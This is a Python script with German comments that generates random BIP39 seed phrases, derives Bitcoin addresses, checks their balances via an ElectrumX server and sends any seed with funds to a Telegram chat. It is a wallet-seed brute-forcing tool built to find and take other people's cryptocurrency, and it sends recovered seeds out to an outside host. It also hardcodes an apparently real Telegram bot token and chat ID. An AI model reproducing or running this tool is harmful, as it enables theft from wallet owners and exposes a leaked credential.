import os
import asyncio
import aiohttp
import logging
from aiogram import Bot
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
from aiohttp import ClientTimeout

# Logger-Konfiguration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Deine Telegram-Token und Chat-ID
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
TELEGRAM_CHAT_ID = "1596333326"  # Deine Chat-ID
ELECTRUMX_SERVER_URL = "http://85.215.178.149:50002"  # Beispiel-URL für ElectrumX-Server

# Bot initialisieren
bot = Bot(token=TELEGRAM_TOKEN)

# Timeout- und Retry-Einstellungen
TIMEOUT = 10  # Timeout in Sekunden
RETRIES = 3  # Maximal 3 Versuche bei einem Fehler

# Sitzung und Verbindungspool für aiohttp wird jetzt innerhalb der main Funktion erstellt
async def notify_telegram(seed, btc_address, btc_balance):
    """Benachrichtige Telegram bei einer gefundenen Wallet"""
    message = f"⚠️ Wallet mit Balance gefunden!\n\nSeed: {seed}\nAdresse: {btc_address}\nBalance: {btc_balance} BTC"
    await bot.send_message(TELEGRAM_CHAT_ID, message)


def generate_bip39_seed():
    """Generiere einen zufälligen BIP39 Seed"""
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)


def bip44_btc_address_from_seed(seed_phrase):
    """Erzeuge eine Bitcoin-Adresse aus einem BIP39 Seed"""
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()


async def check_btc_balance(address, session):
    """Überprüfe den BTC-Guthaben einer Adresse mit einem ElectrumX-Server"""
    attempt = 0
    while attempt < RETRIES:
        try:
            async with session.get(f"{ELECTRUMX_SERVER_URL}/address/{address}") as response:
                data = await response.json()
                balance = data.get("confirmed", 0) / 100000000  # Satoshi zu BTC
                return balance
        except (asyncio.TimeoutError, aiohttp.ClientError) as e:
            attempt += 1
            logging.warning(f"Timeout oder Fehler bei Adresse {address} - Versuch {attempt} von {RETRIES}")
            if attempt >= RETRIES:
                logging.error(f"Maximale Versuche erreicht für Adresse {address}")
                return 0  # Rückgabe von 0 bei Fehlschlägen


async def process_wallet_async(seed, session):
    """Verarbeite einen einzelnen Wallet Seed asynchron"""
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = await check_btc_balance(btc_address, session)
    if btc_balance > 0:
        logging.info(f"Wallet mit Balance gefunden: {btc_address} - Balance: {btc_balance} BTC")
        await notify_telegram(seed, btc_address, btc_balance)


async def main():
    """Hauptfunktion zum Überprüfen von Wallets in Batches"""
    # Sitzung und Verbindungspool für aiohttp wird hier erstellt
    timeout = ClientTimeout(total=TIMEOUT, connect=TIMEOUT, sock_connect=TIMEOUT, sock_read=TIMEOUT)
    async with aiohttp.ClientSession(timeout=timeout) as session:

        seeds = [generate_bip39_seed() for _ in range(10)]  # 1000 Seeds pro Zyklus

        # Parallelisierte Verarbeitung der Seeds
        tasks = []
        for seed in seeds:
            tasks.append(process_wallet_async(seed, session))

        await asyncio.gather(*tasks)


if __name__ == "__main__":
    try:
        # Starten des asynchronen Prozesses
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Script wurde manuell beendet")
